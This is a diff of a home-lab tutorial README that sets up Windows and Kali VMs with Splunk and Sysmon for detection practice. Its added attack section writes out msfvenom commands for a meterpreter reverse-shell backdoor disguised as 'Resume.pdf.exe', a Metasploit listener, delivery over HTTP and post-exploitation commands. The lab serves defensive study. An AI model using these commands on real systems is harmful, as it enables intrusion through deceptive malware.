@@ -37,7 +37,7 @@ This lab is not just about setting up tools—it’s about learning how attacker
 2. Setting up a Hypervisior, where all our virtual machines will be installed.
 3. Installing Windows 10 Pro as our target machine
 4. Installing Kali Linux as our attacking machine
-5. Installing and setup SPLUNK Enterprise on Windows 10 Pro
+5. Installing and setup SPLUNK Enterprise on Windows 10 Pro and configuring Sysmon
 6. Setting up the Network configurations
 7. Generating some logs to check connectivity
 
@@ -95,51 +95,49 @@ After opening the setup, you will be presented with a window like this:
    <img width="428" height="433" alt="image" src="https://github.com/user-attachments/assets/30d6efe3-ccc7-4747-9d8e-00eff6422937" />
 
 9. You can leave it as is but if you have 16 GB ram, i would recommend allocating atleast 4GB. Click on **"Customize Hardware"** and then select **"Memory"** and adjust the slider as needed and click **"OK"**.<br>
-   Make use the **"Power on this virtual machine after creation"** is checked as it will automatically turn on the VM.<br>
+   Make sure the **"Power on this virtual machine after creation"** is checked as it will automatically turn on the VM.<br>
 
-   **NOTE:** The moment you click **"Finish"** it may display **"Press any key"** message so immidiately click on a key to boot to setup. If u miss this and it says **"Time out"** just restart the Virtual machine from the toolbar: **VM > Power > Restart Guest**
-    
+> [!NOTE]
+> The moment you click **"Finish"** it may display **"Press any key"** message so immidiately click on a key to boot to setup. If u miss this and it says **"Time out"** just restart the Virtual machine from the toolbar: **VM > Power > Restart Guest**.   
 
-      <img width="425" height="431" alt="image" src="https://github.com/user-attachments/assets/f769d9a9-7345-46ea-b884-3afd2dab25ad" /><br>
-   
-      <img width="953" height="649" alt="image" src="https://github.com/user-attachments/assets/9abe49a4-2bb9-44dc-9576-47024c236823" /><br>
-   
-      <img width="1890" height="965" alt="image" src="https://github.com/user-attachments/assets/8455f26b-a224-42bc-9011-d18f39db0d4f" />
+   <img width="425" height="431" alt="image" src="https://github.com/user-attachments/assets/f769d9a9-7345-46ea-b884-3afd2dab25ad" /><br>   
+   <img width="953" height="649" alt="image" src="https://github.com/user-attachments/assets/9abe49a4-2bb9-44dc-9576-47024c236823" /><br>   
+   <img width="1890" height="965" alt="image" src="https://github.com/user-attachments/assets/8455f26b-a224-42bc-9011-d18f39db0d4f" />
 
 
-10. Now You should see the Windows Setup screen like this and click on **"Next"** after selecting your preferences: 
+11. Now You should see the Windows Setup screen like this and click on **"Next"** after selecting your preferences: 
 
       <img width="621" height="464" alt="image" src="https://github.com/user-attachments/assets/8a6eeb0e-7279-4e81-9589-3c39135c3551" />
 
-11. Click **"Install Now"**
+12. Click **"Install Now"**
 
       <img width="620" height="455" alt="image" src="https://github.com/user-attachments/assets/e8035172-3bc0-4f4a-8fae-1fb64867df62" />
 
-12. If you are like me and don't have a license (T^T) then click on **"I don't have a product key"**.
+13. If you are like me and don't have a license (T^T) then click on **"I don't have a product key"**.
 
       <img width="641" height="483" alt="image" src="https://github.com/user-attachments/assets/3d19da93-50a4-4a54-a23a-5f853d9ed669" />
 
-13. Select **"Windows 10 Pro"** as this is the one we would be using, and click **"Next"**.
+14. Select **"Windows 10 Pro"** as this is the one we would be using, and click **"Next"**.
 
       <img width="639" height="478" alt="image" src="https://github.com/user-attachments/assets/191eb39d-17d8-4a3f-a9a7-2e38feae7ca1" />
 
-14. Accept the terms and click **"Next"**.
+15. Accept the terms and click **"Next"**.
 
       <img width="642" height="483" alt="image" src="https://github.com/user-attachments/assets/556f2976-b71e-4a4b-8596-51657dbc9f1c" />
 
-15. Select **"Custom"**.
+16. Select **"Custom"**.
 
       <img width="635" height="476" alt="image" src="https://github.com/user-attachments/assets/85b16626-d623-4bb5-8590-d32e54c7e571" />
 
-16. Click **"Next"**.
+17. Click **"Next"**.
 
       <img width="643" height="481" alt="image" src="https://github.com/user-attachments/assets/ba12a543-06b4-49e2-8241-de603787966b" />
 
-17. And now your windows should begin installing.
+18. And now your windows should begin installing.
     
       <img width="643" height="482" alt="image" src="https://github.com/user-attachments/assets/46955b03-84ed-4c60-b6a0-e68fe184c55f" />
 
-18. Now setup windows as you would. After the setup is complete and you boot to the desktop, make sure to take a **"snapshot"**. A snapshot is like a config backup that saves the machines state at the time of creating the snapshot.
+19. Now setup windows as you would. After the setup is complete and you boot to the desktop, make sure to take a **"snapshot"**. A snapshot is like a config backup that saves the machines state at the time of creating the snapshot.
     It will allow you to restore the     machine to the current **"Fresh Install"** state if you break something. Name the snapshot and write a any credientials or info you want in the discription and click **"Take Snapshot"**.
     To revert to a snapshot, in the toolbar: **VM > Snapshot > Revert to a snapshot**
 
@@ -185,12 +183,15 @@ After opening the setup, you will be presented with a window like this:
 
     <img width="1881" height="1008" alt="image" src="https://github.com/user-attachments/assets/18529eaa-a653-486a-ad98-4a75c35a5ea7" />
 
-11. Now power on the machine and use the credentials: **username: root, password: toor** to login for the first time.
+11. Now power on the machine and use the credentials: **username: kali, password: kali** to login for the first time.
     Always change the credentials after logging in for security reasons.<br>
 Just like the windows system, take a Snapshot of the fresh install.
 
 
-## Step 5: Installing SPLUNK Enterprise and configuring it on Windows 10 Pro (VM-target)
+## Step 5: 
+
+### Part 1: Installing SPLUNK Enterprise and configuring it on Windows 10 Pro (VM-target)
+
 1. Power on the Windows 10 Pro VM and update the drivers to their latest versions by going to: **"Settings > Windows Update"**
 
    <img width="1023" height="798" alt="image" src="https://github.com/user-attachments/assets/13829e30-e0cf-47c5-9b59-a89f1b6dc15e" />
@@ -277,13 +278,107 @@ Just like the windows system, take a Snapshot of the fresh install.
 21. This is the search window
 
        <img width="1253" height="581" alt="image" src="https://github.com/user-attachments/assets/87567ea8-2c38-49ca-8483-fdbf09bf7b39" />
-
--Now we have some logs but there is a better way! For that we will be using **"Sysmon"** to get more logs. Now begins the Sysmon setup:
-
+    <br>
 
 
+### Part 2: Sysmon Configuration for Windows 10 Pro
+ 
+Now we have some logs but there is a better way! For that we will be using **"Sysmon"** to get more logs. Now begins the Sysmon setup:
+
+Also the sysmonconfig.xml file is uploaded to this repository so you can just download that one.
+
+1. Download Sysmon from the link: [Sysmon Download](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon). And save the file.
+
+    <img width="1821" height="844" alt="image" src="https://github.com/user-attachments/assets/83a53eca-a3f2-4e1d-ab35-f4ddb530086a" />
+
+2. While Sysmon is downloading, we need a configuration file for sysmon, we will be using [@olafhartong's](https://github.com/olafhartong) configuration file. Link: [Sysmon Configuration File](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml). The file we are looking for is sysmonconfig.xml. Click on **"Raw"**
+
+      <img width="1407" height="801" alt="image" src="https://github.com/user-attachments/assets/16b7deb0-fc25-48af-a271-3ec6206eb1fd" />
+
+3. Select all the file contents with **"CTRL + A"** and then save it using **"CTRL + S"**. Make sure the file name and extension is the same as the below image. For ease of use, save it where the sysmon is being downloaded.
+
+      <img width="1802" height="876" alt="image" src="https://github.com/user-attachments/assets/9952aad1-b94d-4907-a21e-21c69b15f9be" />
+
+4. Extract the Sysmon that has been downloaded
+
+      <img width="464" height="270" alt="image" src="https://github.com/user-attachments/assets/04d95e2f-ce68-4e47-8263-5c5c2d6baad7" />
+
+5. Move the sysmon config file to the extracted folder for ease of use.
+
+      <img width="1111" height="588" alt="image" src="https://github.com/user-attachments/assets/6b691c9b-fe0f-440f-a678-9a4baadba115" />
+
+6.  Open **"Powershell"** with administrator privilages and change directory to the same folder where Sysmon was extracted. 
+   
+          cd "C:\Users\IEUser\Downloads\Sysmon"
+
+      <img width="857" height="524" alt="image" src="https://github.com/user-attachments/assets/4bd3e6ba-507b-4eba-9e35-4b04d4e14d87" />
+
+7. Now enter command **dir** to see if all files are present in the directory. Then enter the command to install sysmon64(Because I'am using a 64bit machine) using the config file and click enter.
+
+         .\Sysmon64.exe -i .\sysmonconfig.xml
+   
+   <img width="825" height="400" alt="image" src="https://github.com/user-attachments/assets/b728ea99-89c0-493a-944d-7cfd9677b101" />
+
+8. This should pop up after running the command:
+
+   <img width="230" height="162" alt="image" src="https://github.com/user-attachments/assets/1ff11f21-2ed2-44c3-8939-6fb3deb2ea45" />
+
+9. After agreeing, sysmon should finish installing. You can double check whether sysmon has been installed from **"Services"**. Search services in the **"Start menu"**
+
+   <img width="1020" height="707" alt="image" src="https://github.com/user-attachments/assets/5bd2cba6-17e9-443b-ba76-b4b4459255f6" />
+
+- Congradulations! Sysmon and SPLUNK has been successfully configured but we still need to make SPLUNK ingest logs from SYSMON to do that:
 
 
+### Part 2: Sysmon Configuration for SPLUNK 
+
+1. Head to where SPLUNK is installed in my case its installed in: **"C:\Program Files\Splunk"**. This is our SPLUNK HOME directory
+
+     <img width="1123" height="593" alt="image" src="https://github.com/user-attachments/assets/4267f983-4336-4999-8539-e0270a9e21e1" />
+
+2. Now head to where the configuration files are stored, i.e, **"/etc/system/local/"**
+
+      <img width="1124" height="591" alt="image" src="https://github.com/user-attachments/assets/b45aff3c-a312-48ec-bc39-ef5efe35a535" />
+
+3. If you dont see an **"inputs.conf"** file, we can copy it from **"/etc/system/default/"**. The file is also uploaded to the repository so you can just download and paste it to your path.
+
+      <img width="1067" height="592" alt="image" src="https://github.com/user-attachments/assets/5cdbd771-80b7-4a79-9b43-ccc5ba74c769" />
+
+4. After adding the file to your local directory, restart your splunkd service from services. Everytime ANY config files are modified, splunk service must be restarted for the new configs to load into memory. If by any chance it shows an error restarting it, just manually stop and start it by right clicking on it.
+
+      <img width="980" height="772" alt="image" src="https://github.com/user-attachments/assets/d0b192dc-e476-4a4a-8e9c-f0b6d3dc0f09" />
+
+5. If you look at the config file, the index listed there is called **"endpoint"**, i.e, the logs are not being stored in the **"main"** index that we configured in splunk before.
+
+      <img width="737" height="514" alt="image" src="https://github.com/user-attachments/assets/99488b1d-17e9-49af-a206-b8f052a7e9c1" />
+
+6. Now we need to create an index named **"endpoint"**. So open SPLUNK web and go to settings.
+
+      <img width="1213" height="528" alt="image" src="https://github.com/user-attachments/assets/d150d378-4a22-46df-a9a5-8fcca7704b3f" />
+
+7. Then navigate to **"indexes"**
+
+      <img width="1229" height="524" alt="image" src="https://github.com/user-attachments/assets/83cb9306-21c9-4f87-851c-c7b3513ab5c7" />
+
+8. Then click on **"Create new index"** and type **"endpoint"** and click **"Save"**.
+
+      <img width="1240" height="571" alt="image" src="https://github.com/user-attachments/assets/99e56ffb-a2b1-481a-b7e1-87b66157dae2" /><br>
+      <img width="829" height="529" alt="image" src="https://github.com/user-attachments/assets/954b012e-ba5b-4fbf-afcf-c779d43e5ab5" /><br>
+      <img width="1210" height="575" alt="image" src="https://github.com/user-attachments/assets/357806ab-ab17-4ad0-ad95-8fb5672cb7b9" />
+
+9. Now sysmon data is not parsed by splunk automatically so we need to download the **"sysmon add-on"**. So navigate to **"Find more apps"**.
+
+      <img width="601" height="286" alt="image" src="https://github.com/user-attachments/assets/8085f262-72ee-4ab6-88ca-325a50eeefde" />
+
+10. Search sysmon in the search bar and install the add-on. You might have to enter your SPLUNK.COM credentials as the downloads are from the splunk marketplace.
+
+       <img width="1237" height="564" alt="image" src="https://github.com/user-attachments/assets/1985d7e2-fc2e-4c73-95b7-d362513d57a3" />
+
+11. After installing is done, go back to **"Search and Reporting"** and type **"index=endpoint"** now you should see lots of logs!!!!
+
+       <img width="1202" height="558" alt="image" src="https://github.com/user-attachments/assets/c6911f43-3110-4cf5-bad3-991d36ca0f7f" />
+
+- Our splunk and sysmon is perfectly configured to work with each other now.
 
 
 ## Step 6: Setting up Network configurations
@@ -314,14 +409,209 @@ Before setting up a network configuration, I will quickly tell you about the dif
 
    <img width="909" height="640" alt="image" src="https://github.com/user-attachments/assets/13d217be-56d5-4ed5-bd11-7568b8b69801" />
 
+-For this lab, we will be assigning static ip to both windows and splunk Kali machine and make sure they can "talk" to each other. Also Windows defender antivirus and firewall will be diasbled on the VM to make sure the attacks are executed properly and that all ports accept inbound traffic.
+
+1. Open VM settings on windows machine and under network adapter settings click on **"Lan Segments..."** and add a lan segment. I have neamed my segment as TEST.
+
+      <img width="933" height="860" alt="image" src="https://github.com/user-attachments/assets/8726b18c-18ce-4863-a387-b04a057b5b67" />
+
+2. Open VM settings on windows machine and set the network connection to **"Lan Segment"** and from the drop down menu select **"TEST"** and click OK.
+
+      <img width="975" height="940" alt="image" src="https://github.com/user-attachments/assets/9f560a20-d514-4099-aef3-42cf86c1436c" />
+
+3. Do the above process for the Kali machine too.
+
+4. In the windows machine open **"control pannel"** and navigate to **"Network and Internet"** > **"Network and Sharing Center"** > **"Change Adapter Settings"**
+
+      <img width="1103" height="505" alt="image" src="https://github.com/user-attachments/assets/8a975ab1-2193-41ec-866d-00521182468b" />
+
+5. Double click **"Ethernet0"** > **"Properties"** > **"Internet Protocol Version 4(TCP/IPv4)"**
+
+      <img width="1159" height="627" alt="image" src="https://github.com/user-attachments/assets/d0746caf-3864-4019-9d2f-feaa31c4c3ba" />
+
+6. Use these settings for static IP configuration and since DNS is left blank, there will be no internet connectivity: click ok and close everything.
+
+      <img width="1121" height="625" alt="image" src="https://github.com/user-attachments/assets/133e9451-ac17-44a5-9e89-fec12a653ab7" />
+
+7. Confirm that static ip is set via running this command in powershell:
+
+         ipfonfig
+      
+      <img width="712" height="391" alt="image" src="https://github.com/user-attachments/assets/6a8a6505-6a2e-48ed-a075-5c415cebdd82" />
+
+8. Now lets do the same in the Kali machine. Right click on the icon in the picture and select **"Edit Connectionns"**
+
+      <img width="605" height="379" alt="image" src="https://github.com/user-attachments/assets/d34265b0-3a6a-4d8d-b08d-cf20e23d4c64" /><br>
+      <img width="605" height="379" alt="image" src="https://github.com/user-attachments/assets/01fd2ef5-ce2c-47c6-bd85-907acbfa59f9" />
+
+9. Now select **"Wired connections"** and click on the gear icon;
+
+      <img width="606" height="479" alt="image" src="https://github.com/user-attachments/assets/8d1b2349-8923-4178-bf70-917374949f6d" />
+
+10. Now select **"IPv4 Settings"**
+
+       <img width="604" height="474" alt="image" src="https://github.com/user-attachments/assets/e1621a22-ee99-4c72-bc5b-f61084cee6da" />
+
+11. No click on DHCP and select manual
+
+       <img width="614" height="483" alt="image" src="https://github.com/user-attachments/assets/cee04bb1-fb0b-4c70-9b45-8267db8dfa0b" />
+
+12. Now click on add:
+
+       <img width="613" height="477" alt="image" src="https://github.com/user-attachments/assets/6daabc7b-6af5-4f97-b88c-28e1f5a187b8" />
+
+13. Now enter the address and click **"Save"** and close everything:
+
+      <img width="699" height="555" alt="image" src="https://github.com/user-attachments/assets/c35ab637-7db1-43f8-96ae-c94dfa0cd4d8" />
 
 
+14. Open terminal by right clicking on the desktop:
+
+       <img width="602" height="514" alt="image" src="https://github.com/user-attachments/assets/e48fbc9b-0e07-4bd6-bee9-1bb9467c786b" />
+
+15. Run the command to check if IP has been assigned.
+       
+          ip a
+       <img width="858" height="463" alt="image" src="https://github.com/user-attachments/assets/516a9deb-bf2e-42cc-ac03-205dcf618a5b" />
+
+16. check if windows is reachable by pinging the windows ip from terminal
+
+          ping 192.168.20.11
+    <img width="652" height="334" alt="image" src="https://github.com/user-attachments/assets/700630bc-d4f5-4053-9034-3e665d9fde8e" />
+
+17. Do the same on windows machine to check if kali is reachable
+
+    <img width="596" height="315" alt="image" src="https://github.com/user-attachments/assets/29f7fc4c-3751-47fa-92e5-4a676dc7e379" />
 
 
+- We are getting replies in both cases which means connection was successful.
+
+> [!NOTE]
+> Remember to disable the firewalls.
 
 
+## Step 7: Generating logs and catching EVIL!!
+
+1. On the kali machine, run **"nmap"** command to see which ports are open on the windows machine and they are highlighted:
+
+         nmap -A 192.168.20.11 -Pn
+
+      <img width="1583" height="720" alt="image" src="https://github.com/user-attachments/assets/d626d083-1233-40bb-a73f-ca96bcaa16ba" />
+
+> [!CAUTION]
+> This lab is purely for learning purposes, DO NOT use these techniques to cause harm or you will get picked up by cops and generally these tactics WILL be detected by antiviruses.
+
+2. Next we need to build our malware. I'll be using **"msfvenom"** to create a malware. These are the commands we can use.
+
+       msfvenom
+      <img width="1436" height="673" alt="image" src="https://github.com/user-attachments/assets/8a9a4caf-2fce-4c89-af26-fab9b10b7c27" />
+
+3. To get a list of payloads available to us run this command:
+
+         msfvenom -l payloads
+      <img width="1572" height="798" alt="image" src="https://github.com/user-attachments/assets/cfa614f4-4d25-470b-a28a-a130561f920e" />
+
+4. From this list we will be using the reverse tcp payload to create a backdoor on our target windows machine. Now its time to build the malware equiped with this payload. The name of the file will be **"Resume.pdf.exe"**
+
+         msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.12 lport=4444 -f exe -o Resume.pdf.exe
+      <img width="894" height="371" alt="image" src="https://github.com/user-attachments/assets/b3fc3464-02f7-49df-8132-f9025531b3a4" />
+
+5. Check if the file is present
+
+         ls
+      <img width="973" height="466" alt="image" src="https://github.com/user-attachments/assets/7bef3b9d-763c-4d87-9ac7-2d4950258263" />
+
+6. Now lets open metasploit console
+
+         msfconsole
+      <img width="862" height="728" alt="image" src="https://github.com/user-attachments/assets/334f406d-f864-4ca7-b275-2c9d5fed678e" />
+
+7. This console will be used to configure our payload and to interract with the malware once its executed in the target machine. We will use multi handler:
+
+         use exploit/multi/handler
+      <img width="489" height="70" alt="image" src="https://github.com/user-attachments/assets/859b86af-fa2c-4f66-9fcf-ea9c6c33a860" />
+
+8. Lets see what we can configure using this command:
+
+         options
+      <img width="772" height="323" alt="image" src="https://github.com/user-attachments/assets/c67dd990-bc4f-4805-b2e3-cebb91a00593" />
+
+9. Change the payload to the payload we have used in our malware and run options command:
+
+          set payload windows/x64/meterpreter_reverse_tcp
+          options
+      <img width="842" height="394" alt="image" src="https://github.com/user-attachments/assets/0548dd19-ef75-4bca-acaa-2cc3a37f3c49" />
+
+10. Set lhost to the IP of attacker machine
+
+          set lhost 192.168.20.12
+       <img width="863" height="400" alt="image" src="https://github.com/user-attachments/assets/cd4b0bb7-7e79-429b-8578-211fbce2ff68" />
+
+11. Now lets start the handler so it will be listening for the malware connection:
+
+          exploit
+       <img width="809" height="71" alt="image" src="https://github.com/user-attachments/assets/f0b724d5-8294-44ad-bb0f-6c9995518d60" />
+
+12. Now to send the payload to our target machine, we will be setting up a http server on our Kali machine that will host the directory on a port for the target machine to download the file from:
+    Open a new terminal tab:
+    
+       <img width="860" height="287" alt="image" src="https://github.com/user-attachments/assets/b1c06e33-0eed-43db-b8c4-c6176296e455" />
+
+13. Turn on the http server using python on port 9999
+
+           python -m http.server 9999
+       <img width="638" height="279" alt="image" src="https://github.com/user-attachments/assets/b34470dd-c7ae-412c-b56a-bc8ce3bf96ec" />
+
+14. Move to the Windows machine and open a web browser and enter the IP and port of the kali machine to access the server:
+
+       <img width="1565" height="438" alt="image" src="https://github.com/user-attachments/assets/3ce62295-963a-482a-8811-f3dbc6bd9b29" />
+
+15. Click on the **"Resume.pdf.exe"** to download it. once its downloaded, run it. Select **"Run"**:
+
+       <img width="531" height="498" alt="image" src="https://github.com/user-attachments/assets/38a9e321-a388-4a37-bdf0-ce1fb18758e2" />
 
 
+16. To see if a connection has been established, run this command on the windows, scroll down and you will see an established connection:
+
+          netstat -anob
+       <img width="841" height="699" alt="image" src="https://github.com/user-attachments/assets/9896c0e9-21b3-47eb-a8ee-5caae03d5ae1" />
+
+17. Back to the Kali machine, on the metasploit console you can see that the backdoor is successful:
+
+
+       <img width="882" height="145" alt="image" src="https://github.com/user-attachments/assets/8efda176-e9a9-4a33-b7db-e8034bc4a0ad" />
+
+19. Run this command to see what the exploit has to offer:
+
+          help
+       <img width="772" height="711" alt="image" src="https://github.com/user-attachments/assets/f690ecb9-446c-4adf-9009-979d18777d1a" />
+
+20. Lets connect to the target's terminal:
+
+          shell
+       <img width="733" height="132" alt="image" src="https://github.com/user-attachments/assets/93f0604a-9790-4526-a99d-0754dd2b96c4" />
+
+       
+21. Now that the target is at our mercy, lets run some commands:
+
+         net user
+         net localgroup
+         ipconfig
+      <img width="745" height="619" alt="image" src="https://github.com/user-attachments/assets/c742b93a-91c0-43a0-91ec-19cb9842bfec" />
+      <img width="665" height="315" alt="image" src="https://github.com/user-attachments/assets/64c57cd8-2710-4e26-909d-462b13a41eaa" />
+
+22. Now lets go back to windows machine and check what logs are available on SPLUNK
+       
+
+## Log Analysis and Threat detection
+
+<img width="1327" height="844" alt="image" src="https://github.com/user-attachments/assets/bc85dfd9-2326-4876-bfb6-4243101563eb" />
+
+
+-The file that contained the malware is Resume(1).pdf.exe on the target machine as it was downloaded twice.
+-The EventCodes 1116 shows malware detected but not remediated: Our malware was detected by antivirus because realtime protection was not turned off
+-1117 Shows malware was remediated. we allowed the malware to run and turned off real time protection.
+-
 
 
 
